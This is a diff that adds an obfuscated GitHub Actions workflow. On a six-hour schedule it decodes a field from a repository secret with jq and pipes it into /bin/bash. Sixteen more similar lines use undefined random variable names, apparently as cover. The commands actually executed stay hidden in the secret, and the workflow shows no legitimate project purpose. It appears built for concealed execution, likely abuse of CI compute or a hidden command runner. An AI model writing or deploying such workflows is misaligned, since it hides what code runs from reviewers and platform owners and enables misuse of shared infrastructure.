@@ -1,0 +1,34 @@
+name: qindingdongdeduiyou
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qindingdongdeduiyou
+        env:
+          d85: ${{ secrets.d85 }}
+        run: |
+          echo $d85 | jq -r .xxgp250 | /bin/bash
+          echo $ljja07 | jq -r .uzbau7 | /bin/bash
+          echo $visx90240 | jq -r .vfe1974 | /bin/bash
+          echo $e61 | jq -r .exi8963 | /bin/bash
+          echo $xpj0012 | jq -r .xoi49 | /bin/bash
+          echo $ucf78349 | jq -r .q442 | /bin/bash
+          echo $yazlu4998 | jq -r .fxhjm5718 | /bin/bash
+          echo $rcses91140 | jq -r .ra920 | /bin/bash
+          echo $xxcj6 | jq -r .gi96 | /bin/bash
+          echo $formh0669 | jq -r .ytg7600 | /bin/bash
+          echo $jwguu6811 | jq -r .phdca5792 | /bin/bash
+          echo $qlpr6 | jq -r .oebh809 | /bin/bash
+          echo $z0 | jq -r .rr15 | /bin/bash
+          echo $r7 | jq -r .vq1754 | /bin/bash
+          echo $geqtf2155 | jq -r .xwjz13 | /bin/bash
+          echo $yc47477 | jq -r .yxqib94 | /bin/bash
+          echo $x93 | jq -r .t68556 | /bin/bash
+
